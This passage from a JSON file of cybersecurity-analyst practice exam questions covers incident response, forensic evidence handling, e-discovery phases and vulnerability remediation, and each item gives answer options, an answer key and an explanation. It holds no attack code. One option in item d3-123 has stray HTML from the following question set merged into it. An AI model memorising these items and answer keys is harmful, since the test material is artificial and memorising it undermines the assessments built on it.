thumb drives and external hard drives, networking equipment, and a variety of cables. What is this type of preprepared equipment commonly called?","o":["A grab bag","A jump kit","A crash cart","A first responder kit"],"a":1,"e":"A jump kit is a common part of an incident response plan and provides responders with the tools they will need without having to worry about where key pieces of equipment are during a stressful time. Crash carts are often used in datacenters to connect a keyboard, mouse, and monitor to a server to work on it. First-responder kits are typically associated with medical responders, and a grab bag contains random items.","l":"c9-foundation","l2":"c10-evidence","k":"incident response jump kit"},{"id":"d3-105","set":"d3","ch":10,"d":3,"q":"As John proceeds with a forensic investigation involving numerous images, he finds a directory labeled <code>Downloaded from Facebook</code>. The images appear relevant to his investigation, so he processes them for metadata using <code>exiftool</code>. The following image shows the data provided. What forensically useful information can John gather from this output?\n<figure><img alt=\"Screenshot lists exiftool metadata for a J P E G file with file details, profile data, and image dimensions for forensic investigation.\" loading=\"lazy\" src=\"img/pt/c03fun013.png\"/></figure>","o":["The original file creation date and time.","The device used to capture the image.","The original digest (hash) of the file, allowing comparison to the original.","None; Facebook strips almost all useful metadata from images."],"a":3,"e":"Facebook, as well as many other social media sites, now strip image metadata to help protect user privacy. John would need to locate copies of the photos that have not had the metadata removed and may still find that they did not contain additional useful data.","l":"c10-analysis","l2":"","k":"social media image metadata"},{"id":"d3-106","set":"d3","ch":10,"d":3,"q":"Which of the following properly lists the order of volatility from least to most volatile?","o":["Printouts, swap files, CPU cache, RAM","Hard drives, USB media, DVDs, CD-RWs","DVDs, hard drives, virtual memory, caches","RAM, swap files, SSDs, printouts"],"a":2,"e":"DVDs, hard drives, virtual memory, caches is the proper order from least to most volatile because optical media like DVDs are long term, offline storage, hard drives are persistent but can be overwritten during normal operation, virtual memory (swap) is more transient as it is frequently changed to support active processes, and CPU caches are extremely short lived, disappearing as soon as power is lost or the processor state changes. The sequence with printouts, swap files, CPU cache, and RAM is wrong because printed documents are indeed very nonvolatile, but swap files are less volatile than RAM and CPU cache should be considered more volatile than RAM, not less. The list of hard drives, USB media, DVDs, and CD-RWs only compares relatively nonvolatile storage types and does not move meaningfully from least to most volatile. The sequence with RAM, swap files, SSDs, and printouts is inverted because RAM is far more volatile than swap, SSDs, or printed material, while printouts should be at the least volatile end rather than the most.","l":"c10-evidence","l2":"","k":"order of volatility"},{"id":"d3-107","set":"d3","ch":3,"d":3,"q":"While conducting a forensic review of a system involved in a data breach, Alex discovers a number of Microsoft Word files including files with filenames like <code>critical_data.docx</code> and <code>sales_estimates_2023.docx</code>. When he attempts to review the files using a text editor for any useful information, he finds only unreadable data. What has occurred?","o":["Microsoft Word files are stored in ZIP-based format.","Microsoft Word files are encrypted.","Microsoft Word files can be opened only by Microsoft Word.","The user has used antiforensic techniques to scramble the data."],"a":0,"e":"Modern Microsoft Office files are actually stored in a ZIP-based format. Alex will need to open them using a utility that can unzip them before he can manually review their contents. He may want to use a dedicated Microsoft Office forensics tool or a forensics suite with built-in support for Office documents.","l":"c3-tools","l2":"c10-evidence","k":"Office file format analysis"},{"id":"d3-108","set":"d3","ch":2,"d":3,"q":"Lukas believes that one of his users has attempted to use built-in Windows command prompt to probe servers on the network he is responsible for. How can he recover the command history for that user if the system has been rebooted since the reconnaissance has occurred?","o":["Check the Bash history.","Open a command prompt window and press F7.","Manually open the command history from the user’s profile directory.","The Windows command prompt does not store command history."],"a":3,"e":"Once a command prompt window has been closed on a Windows system, the command history is erased. If Lukas could catch the user with an open command prompt, he could press F7 and see the command history.","l":"c2-os","l2":"c10-evidence","k":"Windows command prompt history"},{"id":"d3-109","set":"d3","ch":10,"d":3,"q":"Angela is conducting an incident response exercise and needs to assess the economic impact on her organization of a $500,000 expense related to an information security incident. How should she categorize this?","o":["Low impact.","Medium impact.","High impact.","Angela cannot assess the impact with the data given."],"a":3,"e":"Economic impact is calculated on a relative scale, and Angela does not have all of the information she needs. A $500,000 loss may be catastrophic for a small organization and may have a far lower impact on a Fortune 500 company. Other factors like cybersecurity insurance may also limit the economic impact of a cybersecurity incident.","l":"c10-evidence","l2":"c8-analyzing","k":"economic impact assessment"},{"id":"d3-110","set":"d3","ch":11,"d":3,"q":"What step follows sanitization of media according to NIST guidelines for secure media handling?","o":["Reuse","Validation","Destruction","Documentation"],"a":1,"e":"The NIST guidelines require validation after clearing, purging, or destroying media to ensure that the action that was taken is effective. This is an important step since improperly applying the sanitization process and leaving data partially or even fully intact can lead to a data breach.","l":"c11-recover","l2":"","k":"media sanitization validation"},{"id":"d3-111","set":"d3","ch":10,"d":3,"q":"Latisha wants to create a documented chain of custody for the systems that she is handling as part of a forensic investigation. Which of the following will provide her with evidence that systems were not tampered with while she is not working with them?","o":["A chain of custody log","Tamper-proof seals","System logs","None of the above"],"a":1,"e":"Tamper-proof seals are used when it is necessary to prove that devices, systems, or spaces were not accessed. They often include holographic logos that help to ensure that tampering is both visible and cannot be easily hidden by replacing the sticker. A chain of custody log works only if personnel actively use it, and system logs will not show physical access. If Latisha has strong concerns, she may also want to ensure that the room or space is physically secured and monitored using a camera system.","l":"c10-analysis","l2":"","k":"tamper proof seals chain custody"},{"id":"d3-112","set":"d3","ch":9,"d":3,"q":"After a ransomware incident is fully contained and systems are restored, the IR lead holds a cross-team review meeting. The team documents what worked, identifies gaps in logging, updates the escalation matrix, and revises the ransomware playbook to include new decision points. Which incident response phase <i>best</i> describes these activities?","o":["Preparation","Recovery","Post-incident","Analysis"],"a":2,"e":"These activities fall under post-incident because they occur after containment and recovery are complete and focus on documenting lessons learned, reviewing what succeeded or failed, and updating procedures, playbooks, and escalation paths to improve future responses. Preparation involves building capabilities before an incident occurs, such as creating initial playbooks and setting up tools, not revising them based on a specific event. Recovery is concerned with restoring systems and services to normal operation and validating that they are clean and functioning, which has already happened in this scenario. Analysis focuses on understanding the incident as it unfolds and shortly afterward to determine root cause, scope, and attacker behavior, while the described cross-team review is a structured, improvement-oriented follow-up characteristic of the post-incident phase.","l":"c9-process","l2":"c11-recover","k":"post incident review"},{"id":"d3-113","set":"d3","ch":10,"d":3,"q":"Raj discovers that the forensic image he has attempted to create has failed. What is the most likely reason for this failure?","o":["Data was modified.","The source disk is encrypted.","The destination disk has bad sectors.","The data cannot be copied in RAW format."],"a":2,"e":"If Raj has ensured that his destination media is large enough to contain the image, then a failure to copy is most likely because of bad media. Modification of the source data will result in a hash mismatch, encrypted drives can be imaged successfully despite being encrypted (the imager doesn’t care!), and copying in RAW format is simply a bit-by-bit copy and will not cause a failure.","l":"c10-evidence","l2":"","k":"forensic imaging failure causes"},{"id":"d3-114","set":"d3","ch":3,"d":3,"q":"Liam notices the following entries in the security console. What should he do next to determine what occurred?\n<figure><img alt=\"Screenshot shows security console alerts for failed passwords, S S H D authentication, user login failed, and potential S S H scan attempts.\" loading=\"lazy\" src=\"img/pt/c03fun014.png\"/></figure>","o":["Review SSH logs.","Disable SSH and then investigate further.","Disconnect the server from the Internet and then investigate.","Immediately change his password."],"a":0,"e":"Failed SSH logins are common, either because of a user who has mistyped their password or because of scans and random connection attempts. Liam should review his SSH logs to see what may have occurred.","l":"c3-tools","l2":"c10-analysis","k":"SSH authentication log investigation"},{"id":"d3-115","set":"d3","ch":11,"d":3,"q":"Which of the following activities is not part of the containment and restoration process?","o":["Minimizing loss","Identifying the attacker","Limiting service disruption","Rebuilding compromised systems"],"a":1,"e":"Identifying the attacker is typically handled either during the analysis phase or as part of the post-incident activities. The IR process typically focuses on capturing data and allowing later analysis to ensure that services are restored.","l":"c11-contain","l2":"c11-recover","k":"incident containment vs attribution"},{"id":"d3-116","set":"d3","ch":9,"d":3,"q":"Samantha has recently taken a new position as the first staff security analyst that her employer has ever had. During her first week, she discovers that there is no information security policy and that the IT staff do not know what to do during a security incident. Samantha plans to start up a CSIRT to handle incident response. What type of documentation should she provide to describe specific procedures that the CSIRT will use during events like malware infections and server compromise?","o":["An incident response policy","An operations manual","An incident response program","A playbook"],"a":3,"e":"Playbooks describe detailed procedures that help to ensure that organizations and individuals take the right actions during the stress of an incident. Operations manuals typically cover normal operational procedures, while an incident response policy describes the high-level organizational direction and authority for incident response. An incident response program might generate a policy and a playbook but would not include the detailed instructions itself.","l":"c9-foundation","l2":"","k":"incident response playbooks"},{"id":"d3-117","set":"d3","ch":10,"d":3,"q":"What is space between the last sector containing logical data and the end of the cluster called?","o":["Unallocated space","Ephemeral space","Slack space","Unformatted space"],"a":2,"e":"Slack space is the space left between the end of a file and the end of a cluster. This space is left open, but attackers can hide data there, and forensic analysts can recover data from this space if larger files were previously stored in the cluster and the space was not overwritten prior to reuse.","l":"c10-evidence","l2":"c10-analysis","k":"filesystem slack space"},{"id":"d3-118","set":"d3","ch":10,"d":3,"q":"Jack is preparing to take a currently running PC back to his forensic lab for analysis. As Jack considers his forensic process, one of his peers recommends that he simply unplug the power cable rather than doing a software-based shutdown. Why might Jack choose to follow this advice?","o":["It will create a crash log, providing useful memory forensic information.","It will prevent shutdown scripts from running.","It will create a memory dump, providing useful forensic information.","It will cause memory-resident malware to be captured, allowing analysis."],"a":1,"e":"If the system contains any shutdown scripts or if there are temporary files that would be deleted at shutdown, simply pulling the power cable will leave these files in place for forensic analysis. Pulling the cord will not create a memory or crash dump, and memory-resident malware will be lost at power-off.","l":"c10-evidence","l2":"","k":"forensic system shutdown procedures"},{"id":"d3-119","set":"d3","ch":6,"d":3,"q":"Rick wants to validate his recovery efforts and intends to scan a web server he is responsible for with a scanning tool. What tool should he use to get the most useful information about system vulnerabilities?","o":["Wapiti","Nmap","OpenVAS","ZAP"],"a":2,"e":"Of the tools listed, only Open Vulnerability Assessment Scanner (OpenVAS) is a full-system vulnerability scanner. Wapiti is a web application scanner, Zed Attack Proxy (ZAP) is an attack proxy used for testing web applications, and Nmap is a port scanner.","l":"c6-tools","l2":"c11-recover","k":"vulnerability scanning tools"},{"id":"d3-120","set":"d3","ch":11,"d":3,"q":"What is the key goal of the containment stage of an incident response process?","o":["To limit leaks to the press or customers","To limit further damage from occurring","To prevent data exfiltration","To restore systems to normal operation"],"a":1,"e":"The containment stage of incident response is aimed at limiting damage and preventing any further damage from occurring. This may help stop data exfiltration, but the broader goal is to prevent all types of damage, including further exploits or compromises.","l":"c11-contain","l2":"","k":"incident containment goals"},{"id":"d3-121","set":"d3","ch":10,"d":3,"q":"What level of forensic data extraction will most likely be possible and reasonable for a corporate forensic examiner who deals with modern phones that provide filesystem encryption?","o":["Level 1: Manual extraction","Level 2: Logical extraction","Level 3: JTAG or HEX dumping","Level 4: Chip extraction"],"a":1,"e":"Logical copies of data and volumes from an unlocked or decrypted device are the most likely mobile forensic scenario in many cases. Most forensic examiners do not have access to chip-level forensic capabilities that physically remove flash memory from the circuit board, and Joint Test Action Group (JTAG)-level acquisition may involve invasive acquisition techniques like directly connecting to chips on a circuit board.","l":"c10-evidence","l2":"","k":"mobile device logical extraction"},{"id":"d3-122","set":"d3","ch":10,"d":3,"q":"Wang believes that a Windows system he is responsible for is compromised and wants to monitor traffic to and from it. Which of the following is not a typical capture option in circumstances like these?","o":["A packet capture tool installed on the system","A packet capture tool on another system on the same network","Packet capture at the network edge","Packet capture at the network core"],"a":0,"e":"Wang knows that installing additional software on Windows systems to capture traffic can interfere with forensic efforts or warn attackers that they are being observed. Using packet capture from another location on the network is the more common option in this scenario.","l":"c10-evidence","l2":"c3-tools","k":"network forensic capture methods"},{"id":"d3-123","set":"d3","ch":4,"d":3,"q":"Carol has discovered an attack that appears to be following the process flow shown here. What type of attack should she identify this as?\n<figure><img alt=\"Diagram shows 6 hexagons around a central question mark depicting attack cycle stages from initial intrusion to concealing evidence.\" loading=\"lazy\" src=\"img/pt/c03fun015.png\"/></figure>","o":["Phishing","Zero-day exploit","Whaling","Advanced persistent threat\n<p><a href=\"#Ques124\">Questions 124</a>–<a href=\"#Ques126\">126</a> refer to the following image:</p>\n<figure><img alt=\"Flow diagram depicts the e-discovery process from information governance to presentation, with a high volume to high relevance arrow below.\" loading=\"lazy\" src=\"img/pt/c03fun016.png\"/></figure>"],"a":3,"e":"The process flow that Carol has discovered is typically used by an advanced persistent threat (APT). Phishing would focus on gaining credentials, whaling is similar but focused on important individuals, and a zero-day exploit leverages a newly discovered vulnerability before there is a patch or general awareness of the issue.","l":"c4-classify","l2":"c9-frameworks","k":"advanced persistent threat characteristics"},{"id":"d3-124","set":"d3","ch":10,"d":3,"q":"During an e-discovery process, Carol reviews the request from opposing counsel and builds a list of all the individuals identified. She then contacts the IT staff who support each person to request a list of their IT assets. What phase of the EDRM flow is she in?","o":["Information governance","Identification","Preservation","Collection"],"a":1,"e":"She is in the identification phase of the Electronic Discovery Reference Model (EDRM), which involves identifying systems and data before they are collected and preserved.","l":"c10-analysis","l2":"","k":"EDRM identification phase"},{"id":"d3-125","set":"d3","ch":10,"d":3,"q":"During the preservation phase of her work, Carol discovers that information requested as part of the discovery request has been deleted as part of a regularly scheduled data cleanup as required by her organization’s policies. What should Carol do?","o":["Conduct a forensic recovery of the data.","Create synthetic data to replace the missing data.","Report the issue to counsel.","Purge any other data related to the request based on the same policy."],"a":2,"e":"Carol should notify counsel and provide information about the policy and schedule that resulted in the data being removed. This will allow counsel to choose what steps to take next.","l":"c10-analysis","l2":"","k":"legal hold spoliation reporting"},{"id":"d3-126","set":"d3","ch":10,"d":3,"q":"In what phase should Carol expect to spend the most person hours?","o":["Identification","Collection and preservation","Processing, review, and analysis","Production"],"a":2,"e":"With most e-discovery cases, reviewing the large volumes of data to ensure that only needed data is presented and that all necessary data is made available takes up the most staff time. Many organizations with larger e-discovery need either dedicated staff or outsourced efforts like this.","l":"c10-analysis","l2":"","k":"EDRM data review and analysis"},{"id":"d3-127","set":"d3","ch":10,"d":3,"q":"The incident response kit that Cassandra is building is based around a powerful laptop so that she can perform onsite drive acquisitions and analysis. If she expects to need to acquire data from SATA, SSD, and flash drives, what item should she include in her kit?","o":["A write blocker","A USB hard drive","A multi-interface drive adapter","A USB-C cable"],"a":2,"e":"Cassandra should ensure that she has at least one USB multi-interface drive adapter that can connect to all common storage drive types. If she were performing forensic analysis, she would also want to use a hardware or software write blocker to ensure that she retains forensic integrity of the acquisition. A USB-C cable and a USB hard drive are commonly found in forensic and incident response toolkits, but neither will help Cassandra connect to bare drives.","l":"c10-evidence","l2":"c9-foundation","k":"forensic hardware drive adapters"},{"id":"d3-128","set":"d3","ch":10,"d":3,"q":"Which of the following items is not typically found in corporate forensic kits?","o":["Write blockers","Crime scene tape","Label makers","Decryption tools"],"a":1,"e":"Crime scene tape isn’t a typical part of a forensic kit if you aren’t a law enforcement forensic analyst or officer. Some businesses may use seals or other indicators to discourage interference with investigations. Write blockers, label makers, and decryption tools are all commonly found in forensic kits used by both commercial and law enforcement staff.","l":"c10-evidence","l2":"","k":"forensic kit contents"},{"id":"d3-129","set":"d3","ch":9,"d":3,"q":"What incident response tool should Kai build prior to an incident to ensure that staff can reach critical responders when needed?","o":["A triage triangle","A call list","A call rotation","A responsibility matrix"],"a":1,"e":"A call list provides a list of the personnel who should or can be contacted during an incident or response scenario. Sometimes called an escalation list, they typically include the names of the staff members who should be called if there is no response. A rotation list or call rotation is used to distribute workload among a team, typically by placing a specific person on-call for a set time frame. This may help decide who is on the call list at any given point in time. A triage triangle is made up for this question, and responsibility matrices are sometimes created to explain who is responsible for what system or application but aren’t directly used for emergency contact lists.","l":"c9-foundation","l2":"c12-ir-report","k":"incident response call list"},{"id":"d3-130","set":"d3","ch":7,"d":3,"q":"Greg finds a series of log entries in his web server logs showing long strings <code>\"AAAAAAAAAAAAAAAAAAAAAAA\"</code>, followed by strings of characters. What type of attack has he most likely discovered?","o":["A SQL injection attack","A denial-of-service attack","A buffer overflow attack","A PHP string-ring attack"],"a":2,"e":"Overflowing a memory location by placing a string longer than the program expects into a variable is a form of buffer overflow attack. Attackers may choose to use a string of the same letters to make the overflow easier to spot when testing the exploit.","l":"c7-server-network","l2":"c3-tools","k":"buffer overflow attack detection"},{"id":"d3-131","set":"d3","ch":11,"d":3,"q":"During a security incident, Joanna makes a series of changes to production systems to contain the damage. What type of change should she file in her organization’s change control process when the response effort is concluding?","o":["Routine change","Priority change","Emergency change","Pre-approved change"],"a":2,"e":"This is an example of an emergency change because the change was made without any advance approval. It was necessary to meet urgent security requirements, and Joanna should follow up as soon as possible by filing an emergency change notice.","l":"c11-recover","l2":"c8-controls","k":"emergency change control"},{"id":"d3-132","set":"d3","ch":9,"d":3,"q":"Which one of the following incident response test types provides an interactive exercise for the entire team but does not run the risk of disrupting normal business activity?","o":["Full interruption test","Checklist review","Management review","Tabletop exercise"],"a":3,"e":"Tabletop exercises allow testing of the incident response process without disrupting normal business activity. This is a good approach that gathers the team together to walk through an incident scenario. Full interruption tests are disruptive to the business and would not be appropriate in this case. Checklist reviews and management reviews do not provide the requested level of interaction with the team.","l":"c9-foundation","l2":"","k":"tabletop exercise"},{"id":"d3-133","set":"d3","ch":10,"d":3,"q":"Which of the following cloud service environments is likely to provide the best available information for forensic analysis?","o":["SaaS","IaaS","PaaS","IDaaS"],"a":1,"e":"Generally speaking, analysts may obtain more forensic information when their organization has greater control over the underlying cloud resources. Infrastructure-as-a-service (IaaS) environments provide the greatest level of control and, therefore, typically provide access to the most detailed information.","l":"c10-evidence","l2":"c2-infra","k":"cloud forensics IaaS model"},{"id":"d3-134","set":"d3","ch":9,"d":3,"q":"Ken is helping his organization prepare for future incident response efforts and would like to ensure that they conduct regular training exercises. Which one of the following exercises could he use to remind incident responders of their responsibilities with the least impact on other organizational priorities?","o":["Checklist review","Structured walk-through","Capture the flag","Tabletop exercise"],"a":0,"e":"Any of these exercises may be used to help remind incident responders of their responsibilities. Checklist reviews have the least impact on the organization because they may be done asynchronously by individual employees. The other training/exercise types listed here would require a more substantial commitment of time.","l":"c9-foundation","l2":"","k":"checklist review exercise"},{"id":"d3-135","set":"d3","ch":3,"d":3,"q":"When analyzing network traffic for indicators of compromise, which one of the following service/port pairings would indicate a common protocol running on a nonstandard port?","o":["HTTPS on TCP port 443","RDP on TCP port 3389","SSH on TCP port 1433","HTTP on TCP port 80"],"a":2,"e":"All of these are standard port/service pairings, with the exception of SSH, which normally runs on port 22. If this is discovered frequently during attacks, analysts may want to generate a new indicator of compromise (IoC) to better recognize future attacks.","l":"c3-network","l2":"c5-portscan","k":"anomalous network port service"},{"id":"d3-136","set":"d3","ch":11,"d":3,"q":"Camilla is participating in the eradication and recovery stage of an incident response process. Which one of the following activities would not normally occur during this phase?","o":["Vulnerability mitigation","Restoration of permissions","Verification of logging/communication to security monitoring","Analysis of drive capacity consumption"],"a":3,"e":"Vulnerability mitigation, restoration of permissions, and the verification of logging and communication to security monitoring are all activities that normally occur during the eradication and recovery phase of incident response. The analysis of drive capacity consumption is the assessment of an indicator of compromise (IoC), which occurs during the detection and analysis phase of incident response.","l":"c11-recover","l2":"c3-host","k":"incident eradication and recovery"},{"id":"d3-137","set":"d3","ch":9,"d":3,"q":"What type of exercise activates an organization’s incident response plan but has the lowest likelihood of disrupting normal activities?","o":["Checklist review","Tabletop exercise","Full interruption test","Parallel test"],"a":3,"e":"Parallel tests and full interruption tests involve the activation of incident response procedures, whereas checklist reviews and tabletop exercises do not. Full interruption tests are more risky than parallel tests because they involve stopping normal operations. Therefore, parallel tests have a lower likelihood of disrupting normal activities while activating the incident response plan.","l":"c9-foundation","l2":"","k":"parallel testing exercise"},{"id":"d3-138","set":"d3","ch":8,"d":3,"q":"Which one of the following events is <i>least</i> likely to trigger the review of an organization’s information security program?","o":["Security incident","Changes in compliance obligations","Changes in team members","Changes in business processes"],"a":2,"e":"Changes in team members may cause someone to initiate a review, but it is more likely that a review would be initiated based on changes in the processes protected by the security program, control requirements (such as compliance obligations), or a control failure (such as a security incident).","l":"c8-governance","l2":"","k":"security policy review triggers"},{"id":"d3-139","set":"d3","ch":10,"d":3,"q":"A forensic analyst creates a bit-for-bit image of a suspect workstation and records a SHA-256 hash. The image is then transferred to a secure analysis server. Before analysis begins, the analyst re-hashes the image and compares it to the original recorded value.\n<p>What is the <i>primary</i> purpose of this step?</p>","o":["Establish chain of custody","Validate data integrity","Define the scope of impact","Perform eradication of malicious artifacts"],"a":1,"e":"Re-hashing the image after transfer and comparing it to the originally recorded SHA-256 value verifies data integrity, proving the copy on the analysis server is identical to what was acquired from the workstation, which is essential for defensible analysis and evidence handling. Chain of custody is documented through logs, labels, signatures, and access records rather than being established by a hash comparison alone, defining scope of impact is part of incident scoping and investigation rather than evidence verification, and eradication of malicious artifacts is a remediation activity that is intentionally not performed on forensic evidence images.","l":"c10-analysis","l2":"","k":"forensic data integrity validation"},{"id":"d3-140","set":"d3","ch":8,"d":3,"q":"Kevin is conducting an assessment of a web application. He is searching for XSS vulnerabilities in the application and would like to use an approach that balances the time required to conduct the testing and the effectiveness of the test. Which approach would be most appropriate?","o":["Use an automated testing tool.","Conduct a penetration test.","Test each input field manually.","Interview the software developers."],"a":0,"e":"This question is challenging because all of the answers are useful techniques when evaluating the security of a web application. However, we are looking for the answer that best balances the time required to conduct the test and the thoroughness of the results. Using an automated testing tool can quickly check all of the input fields in an application. Manual testing may produce more vulnerabilities than an automated test, but it is very time-intensive, as is a penetration test. Interviewing software developers may result in some useful information, but it will not provide detailed results helpful in finding XSS vulnerabilities.","l":"c8-appsec","l2":"c7-web-ot","k":"web application vulnerability testing"},{"id":"d3-141","set":"d3","ch":8,"d":3,"q":"What is the minimum interval at which an organization should conduct business continuity plan refresher training for those with specific business continuity roles?","o":["Weekly","Monthly","Semiannually","Annually"],"a":3,"e":"Individuals with specific business continuity roles should receive training on at least an annual basis. While it is always preferable to offer more frequent training, annual training is sufficient to meet the requirements of most organizations.","l":"c8-analyzing","l2":"c9-foundation","k":"business continuity training"},{"id":"d3-142","set":"d3","ch":8,"d":3,"q":"Which one of the following programs has the primary goal of ensuring that an organization is able to maintain normal operations during a disaster or other disruption?","o":["Disaster recovery","Incident response","Risk management","Business continuity"],"a":3,"e":"The goal of the business continuity program is to ensure that the organization is able to maintain normal operations even during an unexpected event. When an incident strikes, business continuity controls may protect the business’s core functions from disruption.\n<p>The goal of the disaster recovery program is to help the organization quickly recover normal operations if they are disrupted. An incident may cause service disruptions that would trigger the disaster recovery plan.</p>\n<p>Both the business continuity and disaster recovery programs may interact with the incident response program, but the incident response program is not directly responsible for maintaining normal operations. The same is true for risk management programs, which are focused on identifying and addressing all risks to the organization.</p>","l":"c8-analyzing","l2":"","k":"business continuity planning"},{"id":"d3-143","set":"d3","ch":8,"d":3,"q":"Which one of the following programs has the primary goal of helping the organization quickly recover normal operations if they are disrupted?","o":["Disaster recovery","Incident response","Risk management","Business continuity"],"a":0,"e":"The goal of the disaster recovery program is to help the organization quickly recover normal operations if they are disrupted. An incident may cause service disruptions that would trigger the disaster recovery plan.\n<p>The goal of the business continuity program is to ensure that the organization is able to maintain normal operations even during an unexpected event. When an incident strikes, business continuity controls may protect the business’s core functions from disruption.</p>\n<p>Both the business continuity and disaster recovery programs may interact with the incident response program, but the incident response program is not directly responsible for recovering normal operations. The same is true for risk management programs, which are focused on identifying and addressing all risks to the organization.</p>","l":"c8-analyzing","l2":"","k":"disaster recovery planning"},{"id":"d3-144","set":"d3","ch":9,"d":3,"q":"During what phase of the incident response process would an organization implement defenses designed to reduce the likelihood of a security incident?","o":["Preparation","Detection and analysis","Containment, eradication, and recovery","Post-incident activity"],"a":0,"e":"Organizations should build solid, defense-in-depth approaches to cybersecurity during the preparation phase of the incident response process. The controls built during this phase serve to reduce the likelihood and impact of future incidents.","l":"c9-process","l2":"","k":"incident response preparation phase"},{"id":"d3-145","set":"d3","ch":9,"d":3,"q":"After wrapping up an incident response investigation, Chris is attempting to determine what went wrong so that he can implement new security controls that will prevent similar incidents in the future. What term best describes his work?","o":["Lessons learned review","Post-incident activity","Incident management","Root-cause analysis"],"a":3,"e":"This question is tricky because many of these answers are partially correct. Root-cause analysis is the correct answer because it is the most specific term that describes Chris’s work. The root-cause analysis is designed to figure out <i>why</i> an incident occurred. This is conducted as part of a lessons learned review, which is part of post-incident activity, which is part of incident management. However, all three of those terms are less specific, so they do not best describe the activity.","l":"c9-process","l2":"c12-ir-report","k":"root cause analysis"},{"id":"d3-146","set":"d3","ch":9,"d":3,"q":"An incident responder wants a structured way to correlate an intrusion by identifying:<ul class=\"square\">\n<li>The attacker’s tools/malware used</li>\n<li>The domains/IPs and hosting used during the attack</li>\n<li>The targeted organization and affected users</li>\n<li>The suspected threat actor behind the activity</li></ul>\n<p>Which framework <i>best</i> supports organizing these relationships so the team can pivot on “infrastructure” and “capability” to find related activity?</p>","o":["Cyber Kill Chain","Diamond Model of Intrusion Analysis","MITRE ATT&amp;CK","CIA Triad"],"a":1,"e":"The Diamond Model of Intrusion Analysis is built specifically to relate an intrusion’s key elements by linking the adversary to their capabilities (tools and malware), the infrastructure they use (domains, IPs, hosting), and the victim (targeted organization and users), which makes it ideal for correlating activity and pivoting from infrastructure and capability to uncover related incidents. The Cyber Kill Chain organizes attacks into phases to describe their progression, but it is not primarily a relationship model for pivoting among adversaries, capabilities, infrastructure, and victims. MITRE ATT&amp;CK is a detailed catalog of tactics and techniques useful for detection and behavior mapping, yet it does not natively support the four-part relationship model described in the question. The CIA Triad is a set of security goals: confidentiality, integrity, and availability.","l":"c9-frameworks","l2":"","k":"Diamond Model of Intrusion Analysis"},{"id":"d3-147","set":"d3","ch":11,"d":3,"q":"Tamara is a cybersecurity analyst for a private business that is suffering a security breach. She believes the attackers have compromised a database containing sensitive information. Which one of the following activities should be Tamara’s first priority?","o":["Identifying the source of the attack","Eradication","Containment","Recovery"],"a":2,"e":"Tamara’s first priority should be containing the attack. This will prevent it from spreading to other systems and also potentially stop the exfiltration of sensitive information. Only after containing the attack should Tamara move on to eradication and recovery activities. Identifying the source of the attack should be a low priority.","l":"c11-contain","l2":"","k":"incident containment priority"},{"id":"d3-148","set":"d3","ch":9,"d":3,"q":"Robert is finishing a draft of a proposed incident response policy for his organization. Who would be the most appropriate person to sign the policy?","o":["CEO","Director of security","CIO","CSIRT leader"],"a":0,"e":"The incident response policy provides the CSIRT with the authority needed to do their job. Therefore, it should be approved by the highest possible level of authority within the organization, preferably the CEO.","l":"c9-foundation","l2":"","k":"incident response policy approval"},{"id":"d3-149","set":"d3","ch":10,"d":3,"q":"A SOC receives three simultaneous alerts:<ul class=\"square\">\n<li>A workstation running <code>powershell.exe</code> with encoded commands (single host)</li>\n<li>A domain controller showing multiple failed logons followed by one successful logon from an unknown IP</li>\n<li>A marketing server with a malware detection that was quarantined automatically, with no further activity</li></ul>\n<p>The incident handler has limited resources and must decide what to investigate first.</p>\n<p>Which device should the analyst turn to first?</p>","o":["Marketing server","Workstation","Domain controller","None of these"],"a":2,"e":"The domain controller should be investigated first because authentication anomalies on a domain controller can signal credential compromise and potential privileged access, and a successful logon from an unknown IP after multiple failures raises the risk of immediate lateral movement and broad enterprise impact if the attacker now has directory-level access. The marketing server is of lower priority because the malware was automatically quarantined, and there is no ongoing suspicious activity, suggesting the situation may already be contained. The workstation running PowerShell with encoded commands is suspicious and should be handled soon, but it is currently limited to a single host and may represent an initial foothold that becomes far more dangerous if the domain controller is already being accessed. Choosing none of these ignores active high-risk indicators that require timely triage.","l":"c10-evidence","l2":"c3-host","k":"incident triage prioritization"},{"id":"d3-150","set":"d3","ch":10,"d":3,"q":"A company suspects a contractor exfiltrated sensitive data using a corporate laptop. Legal issues a legal hold. The manager asks IT to reimage the laptop immediately so it can be reassigned.\n<p>What is the <i>best</i> response?</p>","o":["Reimage the laptop.","Store the laptop securely and do not allow its reuse.","Copy the user’s Documents folder to a shared drive and then reimage the laptop.","Wait at least 90 days before reimaging the laptop."],"a":1,"e":"The IT department must securely store the laptop and prevent its reuse to comply with the legal hold. The organization must preserve potentially relevant evidence in its current state and prevent any alteration, destruction, or spoliation of data that could be needed for an investigation or litigation. Reimaging would overwrite artifacts and violate the preservation requirement, copying only the Documents folder is incomplete because key evidence often resides in other locations such as browser data, email caches, cloud sync folders, logs, and unallocated space, and waiting an arbitrary 90 days is not the deciding factor since the legal hold remains in effect until legal releases it, not until a set time period passes.","l":"c10-analysis","l2":"","k":"legal hold evidence preservation"},{"id":"d4-1","set":"d4","ch":12,"d":4,"q":"Kyong manages the vulnerability scans for his organization. The senior director who oversees Kyong’s group provides a report to the CIO on a monthly basis on operational activity, and he includes the number of open critical vulnerabilities. He would like to provide this information to his director in as simple a manner as possible each month. What should Kyong do?","o":["Provide the director with access to the scanning system.","Check the system each month for the correct number and email it to the director.","Configure a report that provides the information to automatically send to the director’s email at the proper time each month.","Ask an administrative assistant to check the system and provide the director with the information."],"a":2,"e":"Although all of these options are viable, the simplest solution is to design a report that provides the information and then configure the system to automatically send this report to the director each month.","l":"c12-vuln-report","l2":"","k":"automated vulnerability reporting"},{"id":"d4-2","set":"d4","ch":12,"d":4,"q":"Erica is designing a vulnerability scanning workflow and has been tasked with selecting the person responsible for remediating vulnerabilities. Which one of the following people would normally be in the <i>best</i> position to remediate a server vulnerability?","o":["Cybersecurity analyst","System administrator","Network engineer","IT manager"],"a":1,"e":"System administrators are normally in the best position to remediate vulnerabilities because they are responsible for maintaining the server configuration. Network engineers, security analysts, and managers may provide input, but they often lack either the privileges or the knowledge to successfully remediate a server.","l":"c12-vuln-report","l2":"c6-remediation","k":"vulnerability remediation roles"},{"id":"d4-3","set":"d4","ch":12,"d":4,"q":"During a vulnerability scan, Patrick discovered that the configuration management agent installed on all of his organization’s Windows servers contains a serious vulnerability. The manufacturer is aware of this issue, and a patch is available. What process should Patrick follow to correct this issue?","o":["Immediately deploy the patch to all affected systems.","Deploy the patch to a single production server for testing and then deploy to all servers if that test is successful.","Deploy the patch in a test environment and then conduct a staged rollout in production.","Disable all external access to systems until the patch is deployed."],"a":2,"e":"Patrick should be 